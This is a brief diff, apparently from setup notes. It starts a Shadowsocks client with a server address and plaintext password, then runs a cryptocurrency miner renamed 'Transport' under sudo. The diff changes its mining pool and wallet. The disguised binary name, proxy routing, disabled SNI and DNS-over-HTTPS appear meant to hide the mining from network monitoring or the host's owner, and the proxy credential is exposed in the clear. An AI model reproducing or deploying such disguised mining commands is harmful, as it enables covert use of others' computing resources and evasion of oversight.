@@ -39,4 +39,4 @@ ss-local -s 129.158.58.77 -p 8388 -l 9999 -k 1rN14HAmV -m chacha20-ietf-poly1305
 
 ph add Transport
 
-sudo ./Transport -a ethash -o stratum+tcp://ethash.kupool.com:1800 -u hunterd.001 -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+sudo ./Transport -a ethash -o asia1.ethermine.org:5555 -u 0xee8d6ac2827f65b369babfe5a4cd31dcdfb96aab -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
